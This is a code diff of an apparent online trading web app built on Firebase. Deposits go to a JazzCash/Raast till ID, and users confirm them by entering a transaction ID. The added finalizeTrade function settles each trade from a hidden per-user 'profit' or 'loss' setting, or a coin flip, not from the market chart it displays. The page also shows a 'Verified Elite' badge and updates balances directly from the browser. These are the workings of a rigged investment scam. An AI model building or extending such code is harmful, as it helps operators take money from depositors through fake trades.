@@ -57,10 +57,12 @@
                 <button onclick="showM('witM')" class="bg-white/10 text-white px-3 py-1.5 rounded-lg text-[9px] font-black uppercase border border-white/10">Withdraw</button>
             </div>
         </header>
+
         <main class="relative flex-grow rounded-[24px] overflow-hidden bg-black mb-2 border border-white/5">
             <div id="tv_chart" class="h-full w-full"></div>
             <div id="tradeTimer" class="timer-badge">⏱ <span id="timerText">00:00</span></div>
         </main>
+
         <footer class="glass-card p-3 rounded-[24px]">
             <div class="grid grid-cols-2 gap-3 mb-3">
                 <div class="bg-black/40 p-2 rounded-xl border border-white/5">
@@ -89,30 +91,40 @@
                 <button onclick="toDStep(2)" class="w-full py-4 bg-yellow-500 text-black font-black rounded-2xl uppercase">Next</button>
             </div>
             <div id="dStep2" class="hidden">
-                <h2 class="text-sm font-bold mb-4 uppercase text-yellow-500 italic">Scan to Pay</h2>
+                <h2 class="text-xs font-bold mb-4 uppercase text-yellow-500 italic">Scan via JazzCash / Raast</h2>
                 <div class="bg-white p-2 rounded-2xl inline-block mb-4">
-                    <img src="https://i.ibb.co/Xf8m8D6R/scanner.jpg" class="w-[220px] rounded-lg" alt="Payment Scanner">
+                    <img src="https://i.ibb.co/Xf8m8D6R/scanner.jpg" class="w-[200px] rounded-lg shadow-lg" alt="Payment Scanner">
                 </div>
                 <div class="bg-black/40 p-3 rounded-xl mb-4 flex justify-between items-center border border-white/10">
-                    <span class="text-[10px] font-bold">TILL ID: 983251948</span>
+                    <span class="text-[10px] font-bold tracking-widest">TILL ID: 983251948</span>
                     <button id="copyBtn" onclick="copyTill()" class="text-yellow-500 text-[10px] font-bold">COPY</button>
                 </div>
                 <button onclick="toDStep(3)" class="w-full py-4 bg-yellow-500 text-black font-black rounded-2xl uppercase">I Have Paid</button>
             </div>
             <div id="dStep3" class="hidden space-y-3">
-                <input type="text" id="depTx" placeholder="Enter Transaction ID (TXID)" class="auth-input">
-                <button onclick="submitFinalDep()" class="w-full py-4 bg-blue-600 text-white font-black rounded-2xl uppercase">Submit</button>
+                <input type="text" id="depTx" placeholder="Enter TXID / Transaction ID" class="auth-input">
+                <button onclick="submitFinalDep()" class="w-full py-4 bg-blue-600 text-white font-black rounded-2xl uppercase">Submit for Review</button>
             </div>
             <button onclick="hideM('depM')" class="mt-4 text-gray-500 text-[10px] font-bold uppercase">Cancel</button>
         </div>
     </div>
 
-    <div id="settingsM" class="modal">...</div>
+    <div id="settingsM" class="modal">
+        <div class="glass-card p-8 rounded-[32px] w-full max-w-sm text-center">
+            <button onclick="hideM('settingsM')" class="absolute top-6 right-6 text-gray-500 text-2xl">×</button>
+            <div class="mb-8">
+                <div id="modalInitial" class="w-20 h-20 bg-yellow-500 rounded-full flex items-center justify-center mx-auto text-3xl font-black text-black mb-4">?</div>
+                <h2 id="modalEmail" class="text-white font-bold text-sm mb-1 italic">Loading...</h2>
+                <span class="text-[8px] bg-green-500/10 text-green-500 px-3 py-1 rounded-full font-bold uppercase">Verified Elite</span>
+            </div>
+            <button onclick="auth.signOut().then(()=>location.reload())" class="w-full py-4 bg-red-600/10 text-red-500 font-black rounded-2xl uppercase text-[10px]">Logout</button>
+        </div>
+    </div>
+
     <div id="resultM" class="modal"><div id="resultBox" class="bg-[#1a1f2e] p-10 rounded-[40px] text-center border border-white/10 w-80"></div></div>
 
     <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
     <script>
-        // Firebase & Logic (Same as your file)
         const firebaseConfig = { apiKey: "AIzaSyAySRA1YSpTpmC8WjnKmDhnNMHkEmkeP50", authDomain: "waqas-47f30.firebaseapp.com", projectId: "waqas-47f30", storageBucket: "waqas-47f30.appspot.com", messagingSenderId: "374104279093", appId: "1:374104279093:web:6e1844b60456c700940364" };
         firebase.initializeApp(firebaseConfig);
         const auth = firebase.auth(), db = firebase.firestore();
@@ -123,7 +135,6 @@
         function toDStep(s) { document.getElementById('dStep1').classList.add('hidden'); document.getElementById('dStep2').classList.add('hidden'); document.getElementById('dStep3').classList.add('hidden'); document.getElementById('dStep'+s).classList.remove('hidden'); }
         function copyTill() { navigator.clipboard.writeText('983251948'); document.getElementById('copyBtn').innerText="COPIED!"; setTimeout(()=>document.getElementById('copyBtn').innerText="COPY",2000); }
 
-        // Rest of your JS logic...
         auth.onAuthStateChanged(user => {
             const loader = document.getElementById('loadingScreen');
             if(user) {
@@ -132,6 +143,8 @@
                     if(userData) {
                         document.getElementById('balanceDisp').innerText = "$" + (userData.balance || 0).toFixed(2);
                         document.getElementById('userInitial').innerText = user.email[0].toUpperCase();
+                        document.getElementById('modalInitial').innerText = user.email[0].toUpperCase();
+                        document.getElementById('modalEmail').innerText = user.email;
                         document.getElementById('authSection').style.display = 'none';
                         document.getElementById('appTerminal').style.display = 'flex';
                         if(!chartLoaded) { new TradingView.widget({ "autosize": true, "symbol": "FX:EURUSD", "interval": "1", "theme": "dark", "container_id": "tv_chart", "hide_top_toolbar": true }); chartLoaded = true; }
@@ -156,10 +169,31 @@
 
         async function submitFinalDep() {
             const tx = document.getElementById('depTx').value;
-            if(!tx) return;
+            if(!tx) return alert("Please enter TXID");
             await db.collection('requests').add({ uid: auth.currentUser.uid, txid: tx, amount: document.getElementById('depAmtInput').value, time: Date.now(), status: 'pending' });
-            hideM('depM'); alert("Submitted! Wait for verification.");
+            hideM('depM'); alert("Payment submitted! Processing usually takes 5-10 mins.");
         }
+
+        async function initTrade(type) {
+            const amt = parseFloat(document.getElementById('tradeAmt').value);
+            if(amt > userData.balance) return alert("Insufficient Balance");
+            await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(-amt) });
+            document.getElementById('tradeTimer').style.display = 'block';
+            let l = 10; // 10s trade
+            let iv = setInterval(() => {
+                document.getElementById('timerText').innerText = `00:${l<10?'0'+l:l}`;
+                if(l <= 0) { clearInterval(iv); document.getElementById('tradeTimer').style.display = 'none'; finalizeTrade(amt); }
+                l--;
+            }, 1000);
+        }
+
+        async function finalizeTrade(amt) {
+            const win = userData.tradeMode === 'profit' ? true : (userData.tradeMode === 'loss' ? false : Math.random() > 0.5);
+            if(win) { await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(amt * 1.8) }); alert("Profit!"); }
+            else { alert("Loss!"); }
+        }
+
+        function switchAuth(t) { mode = t; document.getElementById('loginTab').className = t==='login' ? 'flex-1 py-3 text-sm font-bold bg-[#2d3748] rounded-xl' : 'flex-1 py-3 text-sm font-bold'; document.getElementById('regTab').className = t==='reg' ? 'flex-1 py-3 text-sm font-bold bg-[#2d3748] rounded-xl' : 'flex-1 py-3 text-sm font-bold'; document.getElementById('authBtn').innerText = t==='login'?'Login':'Registration'; }
     </script>
 </body>
 </html>
